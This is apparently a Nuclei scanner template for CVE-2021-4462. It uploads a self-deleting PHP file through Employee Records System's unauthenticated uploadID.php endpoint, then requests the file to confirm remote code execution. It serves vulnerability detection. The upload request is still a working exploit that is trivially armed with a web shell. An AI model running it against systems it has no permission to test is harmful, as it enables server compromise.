http:
- extractors:
  - group: 1
    internal: true
    name: upload_filename
    part: body
    regex:
    - '"upload_filename":"([^"]+)"'
    type: regex
  matchers:
  - condition: and
    dsl:
    - status_code_2 == 200
    - contains(body_2, "{{md5(string)}}")
    type: dsl
  raw:
  - 'POST /dashboard/uploadID.php HTTP/1.1

    Host: {{Hostname}}

    X-Requested-With: XMLHttpRequest

    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW


    ------WebKitFormBoundary7MA4YWxkTrZu0gW

    Content-Disposition: form-data; name="employee_ID"; filename="{{filename}}"

    Content-Type: image/png


    <?php echo md5("{{string}}");unlink(__FILE__); ?>

    ------WebKitFormBoundary7MA4YWxkTrZu0gW--

    '
  - 'GET /uploads/employees_ids/{{upload_filename}} HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-4462
info:
  author: josephttd
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-434
    epss-percentile: 0.93174
    epss-score: 0.11001
  description: 'Employee Records System version 1.0 contains an unrestricted file
    upload vulnerability in uploadID.php that allows remote unauthenticated attackers
    to upload arbitrary PHP files and achieve remote code execution.

    '
  impact: 'Unauthenticated attackers can upload arbitrary PHP files via uploadID.php
    and achieve remote code execution, leading to complete server compromise.

    '
  metadata:
    max-request: 2
    verified: true
  name: Employee Records System 1.0 - Unauthenticated File Upload RCE
  reference:
  - https://www.exploit-db.com/exploits/49596
  - https://www.sourcecodester.com/php/11393/employee-records-system.html
  remediation: 'Apply security patches or upgrade to a later version of Employee Records
    System.

    '
  severity: critical
  tags: cve,cve2021,employee-records,fileupload,rce,intrusive,vkev
variables:
  filename: '{{to_lower(rand_base(5))}}.php'
  string: CVE-2021-4462
